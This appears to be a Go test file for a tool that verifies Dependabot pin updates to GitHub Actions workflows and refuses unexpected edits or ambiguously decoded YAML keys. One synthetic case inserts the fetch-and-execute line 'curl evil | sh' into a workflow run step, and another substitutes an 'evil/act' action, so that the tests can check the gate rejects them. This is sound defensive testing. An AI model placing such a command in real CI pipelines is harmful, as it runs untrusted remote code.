package actions

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func readFixture(t *testing.T, p string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", p))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// Real Dependabot rewrites, recorded from the PRs.
func TestUsesChangesRecorded(t *testing.T) {
	tests := []struct {
		dir, file string
		want      []string // action@old..new per changed line
	}{
		{"sprobot-227", "publish.yaml", []string{
			"docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e..f87e5991a6d7451dcb8d9637bfbc97413f497069",
			"docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a..c3c9e263c25d99ce0380d002d59b67737d91b0dc",
			"docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e..f87e5991a6d7451dcb8d9637bfbc97413f497069",
		}},
		{"sprobot-227", "test.yaml", []string{
			"docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e..f87e5991a6d7451dcb8d9637bfbc97413f497069",
			"docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a..c3c9e263c25d99ce0380d002d59b67737d91b0dc",
		}},
		{"sprobot-232", "publish.yaml", []string{
			"actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a..cf430e030ddbb5b0abf93d22962f4752f3646cd9",
			"actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c..9000827ccba6bdab643e8b6fd33ac0654aef8333",
			"actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c..9000827ccba6bdab643e8b6fd33ac0654aef8333",
		}},
		{"towngear-53", "test.yaml", []string{
			"actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e..d8cbb8045d7f43706b9177cceb36c1f91a6644d5",
		}},
	}
	for _, tt := range tests {
		t.Run(tt.dir+"/"+tt.file, func(t *testing.T) {
			old := readFixture(t, "workflows/"+tt.dir+"/old/"+tt.file)
			new := readFixture(t, "workflows/"+tt.dir+"/new/"+tt.file)
			ch, errs := usesChanges(".github/workflows/"+tt.file, kindWorkflow, old, new)
			if len(errs) > 0 {
				t.Fatalf("unexpected errors: %+v", errs)
			}
			var got []string
			for _, c := range ch {
				got = append(got, c.new.action+"@"+c.old.ref+".."+c.new.ref)
			}
			if strings.Join(got, "\n") != strings.Join(tt.want, "\n") {
				t.Fatalf("got\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(tt.want, "\n"))
			}
		})
	}
}

const wfBase = `name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-26.04
    steps:
      - uses: acme/act@1111111111111111111111111111111111111111 # v1.0.0
      - name: test
        run: |
          echo hi
          uses: acme/act@1111111111111111111111111111111111111111 # v1.0.0
      - name: with input
        uses: acme/other@3333333333333333333333333333333333333333 # v2
        with:
          uses: acme/act@1111111111111111111111111111111111111111
  call:
    uses: acme/wf/.github/workflows/x.yml@4444444444444444444444444444444444444444
`

func TestUsesChangesSynthetic(t *testing.T) {
	const a, b = "1111111111111111111111111111111111111111", "2222222222222222222222222222222222222222"
	tests := []struct {
		name     string
		edit     func(string) string
		changes  int
		errCount int
	}{
		{"step uses", func(s string) string {
			return strings.Replace(s, "acme/act@"+a+" # v1.0.0\n      - name: test", "acme/act@"+b+" # v1.0.1\n      - name: test", 1)
		}, 1, 0},
		{"inside run block", func(s string) string {
			return strings.Replace(s, "          uses: acme/act@"+a, "          uses: acme/act@"+b, 1)
		}, 0, 1},
		{"inside with", func(s string) string {
			return strings.Replace(s, "          uses: acme/act@"+a+"\n", "          uses: acme/act@"+b+"\n", 1)
		}, 0, 1},
		{"job-level reusable workflow", func(s string) string {
			return strings.Replace(s, "x.yml@4444444444444444444444444444444444444444", "x.yml@"+b, 1)
		}, 1, 0},
		{"run line changed", func(s string) string {
			return strings.Replace(s, "echo hi", "curl evil | sh", 1)
		}, 0, 1},
		{"line added", func(s string) string {
			return strings.Replace(s, "    steps:\n", "    steps:\n      - run: id\n", 1)
		}, 0, 1},
		{"action renamed", func(s string) string {
			return strings.Replace(s, "- uses: acme/act@"+a, "- uses: evil/act@"+b, 1)
		}, 0, 1},
		{"indentation changed", func(s string) string {
			return strings.Replace(s, "      - uses: acme/act@"+a, "      -  uses: acme/act@"+b, 1)
		}, 0, 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ch, errs := usesChanges(".github/workflows/ci.yml", kindWorkflow, wfBase, tt.edit(wfBase))
			if len(ch) != tt.changes || len(errs) != tt.errCount {
				t.Fatalf("changes=%d errs=%+v, want %d changes, %d errors", len(ch), errs, tt.changes, tt.errCount)
			}
		})
	}
}

func TestYAMLPath(t *testing.T) {
	lines := splitLines(wfBase)
	tests := []struct {
		line int // 1-based
		want string
	}{
		{7, "jobs.build.steps.-.uses"},
		{9, "jobs.build.steps.-.run"},
		{11, ""}, // inside the run block scalar
		{13, "jobs.build.steps.-.uses"},
		{15, "jobs.build.steps.-.with.uses"},
		{17, "jobs.call.uses"},
	}
	for _, tt := range tests {
		got := strings.Join(yamlPath(lines, tt.line-1), ".")
		if got != tt.want {
			t.Errorf("line %d %q: path %q, want %q", tt.line, lines[tt.line-1], got, tt.want)
		}
	}
	compact := splitLines("runs:\n  using: composite\n  steps:\n  - uses: a/b@c\n    with:\n      x: 1\n")
	if got := strings.Join(yamlPath(compact, 3), "."); got != "runs.steps.-.uses" {
		t.Errorf("compact sequence path %q", got)
	}
}

func TestFileKind(t *testing.T) {
	tests := map[string]string{
		".github/workflows/ci.yml":         kindWorkflow,
		".github/workflows/ci.yaml":        kindWorkflow,
		".github/workflows/sub/ci.yml":     "",
		".github/actions/build/action.yml": kindAction,
		"action.yaml":                      kindAction,
		"README.md":                        "",
		".github/dependabot.yml":           "",
	}
	for p, want := range tests {
		if got := fileKind(p); got != want {
			t.Errorf("fileKind(%q) = %q, want %q", p, got, want)
		}
	}
}

func TestSplitAction(t *testing.T) {
	tests := []struct {
		in, owner, repo, sub string
		ok                   bool
	}{
		{"actions/setup-go", "actions", "setup-go", "", true},
		{"github/codeql-action/init", "github", "codeql-action", "init", true},
		{"docker://alpine:3", "", "", "", false},
		{"./local", "", "", "", false},
		{"a/..", "", "", "", false},
		{"a/b/../../x", "", "", "", false},
		{"bad_owner!/x", "", "", "", false},
	}
	for _, tt := range tests {
		o, r, s, err := splitAction(tt.in)
		if (err == nil) != tt.ok || o != tt.owner || r != tt.repo || s != tt.sub {
			t.Errorf("splitAction(%q) = %q %q %q %v", tt.in, o, r, s, err)
		}
	}
}

// bs is one backslash, so escape sequences in the cases below are built
// rather than written out.
const bs = `\`

// A quoted key GitHub would decode differently from the gate's literal
// reading must fail closed, in both parsers.
var differentialKeys = map[string]string{
	`double-quoted \u escape`: `"p` + bs + `u006fst"`,
	`double-quoted \x escape`: `"p\x6fst"`,
	`single-quoted ''`:        `'r''uns'`,
	`space before colon`:      `"post" `,
	`junk after quote`:        `"post"x`,
}

func TestKeyNameRefusesDecodedKeys(t *testing.T) {
	for name, k := range differentialKeys {
		line := k + ": b.js"
		if _, err := lineTokens("  " + line); err == nil && yamlKeyRx.MatchString(line) {
			t.Errorf("%s: lineTokens accepted %q", name, line)
		}
		if _, _, err := splitKeyValue(line); err == nil && yamlKeyRx.MatchString(line) {
			t.Errorf("%s: splitKeyValue accepted %q", name, line)
		}
		if m, err := parseActionMeta("runs:\n  using: node24\n  main: a.js\n  " + line + "\n"); err == nil {
			t.Errorf("%s: action.yml parsed, post=%q keys=%q", name, m.post, m.raw.(*yMap).sub("runs").keys)
		}
	}
	for _, k := range []string{`"post"`, `'post'`, `post`} {
		m, err := parseActionMeta("runs:\n  using: node24\n  main: a.js\n  " + k + ": b.js\n")
		if err != nil || m.post != "b.js" {
			t.Errorf("%s: post=%q err=%v", k, m.post, err)
		}
		ts, err := lineTokens("  " + k + ": b.js")
		if err != nil || len(ts) != 1 || ts[0].name != "post" {
			t.Errorf("%s: tokens %+v err %v", k, ts, err)
		}
		if key, v, err := splitKeyValue(k + ": b.js # c"); err != nil || key != "post" || v != "b.js" {
			t.Errorf("%s: splitKeyValue = %q %q %v", k, key, v, err)
		}
	}
}

// On the workflow side a refused key on the path to a uses: line makes
// the path unknown, so the rewrite is refused instead of trusted.
func TestUsesChangesRefusesDecodedAncestorKey(t *testing.T) {
	const a, b = "1111111111111111111111111111111111111111", "2222222222222222222222222222222222222222"
	bump := func(s string) string {
		return strings.Replace(s, "acme/act@"+a+" # v1.0.0\n      - name: test", "acme/act@"+b+" # v1.0.1\n      - name: test", 1)
	}
	for name, k := range map[string]string{
		`double-quoted \u escape`: `"j` + bs + `u006fbs"`,
		`double-quoted \x escape`: `"j\x6fbs"`,
		`single-quoted ''`:        `'jo''bs'`,
		`space before colon`:      `"jobs" `,
	} {
		base := strings.Replace(wfBase, "\njobs:\n", "\n"+k+":\n", 1)
		ch, errs := usesChanges(".github/workflows/ci.yml", kindWorkflow, base, bump(base))
		if len(ch) != 0 || len(errs) != 1 {
			t.Errorf("%s: changes=%d errs=%+v, want the rewrite refused", name, len(ch), errs)
		}
	}
	quoted := strings.Replace(wfBase, "\njobs:\n", "\n\"jobs\":\n", 1)
	if ch, errs := usesChanges(".github/workflows/ci.yml", kindWorkflow, quoted, bump(quoted)); len(ch) != 1 || len(errs) != 0 {
		t.Errorf(`literal "jobs": changes=%d errs=%+v`, len(ch), errs)
	}
}

// Values that drive a decision must read as GitHub reads them, or fail.
func TestValueDifferentials(t *testing.T) {
	const sha = "2222222222222222222222222222222222222222"
	for _, l := range []string{
		`      - uses: "acme/act/p` + bs + `u0061th@` + sha + `"`,
		`      - uses: "acme/act@\x32` + sha[1:] + `"`,
	} {
		if _, ok := parseUsesLine(l); ok {
			t.Errorf("parseUsesLine accepted %q", l)
		}
	}
	if u, ok := parseUsesLine(`      - uses: "acme/act/path@` + sha + `" # v1`); !ok || u.action != "acme/act/path" {
		t.Errorf("quoted uses: %+v %v", u, ok)
	}
	for name, runs := range map[string]string{
		"escaped line break":      "  main: \"dist/ind\\\n    ex.js\"\n",
		"blank line in quoted":    "  main: 'dist/a\n\n    b.js'\n",
		"blank line in plain":     "  main: dist/a\n\n    b.js\n",
		"plain after comment":     "  main: dist/a # x\n    b.js\n",
		"surrogate escape":        "  main: \"dist/\\ud800.js\"\n",
		"out-of-range \\U escape": "  main: \"dist/\\U00110000.js\"\n",
	} {
		if m, err := parseActionMeta("runs:\n  using: node24\n" + runs); err == nil {
			t.Errorf("%s: parsed, main=%q", name, m.main)
		}
	}
	for runs, want := range map[string]string{
		"  main: \"dist/index.js\"\n":       "dist/index.js",
		"  main: \"dist/\\x69ndex.js\"\n":   "dist/index.js",
		"  main: 'dist/it''s.js'\n":         "dist/it's.js",
		"  main: \"dist/a   \n    b.js\"\n": "dist/a b.js",
		"  main: dist/a\n    b.js\n":        "dist/a b.js",
	} {
		if m, err := parseActionMeta("runs:\n  using: node24\n" + runs); err != nil || m.main != want {
			t.Errorf("%q: main=%q err=%v, want %q", runs, m.main, err, want)
		}
	}
}
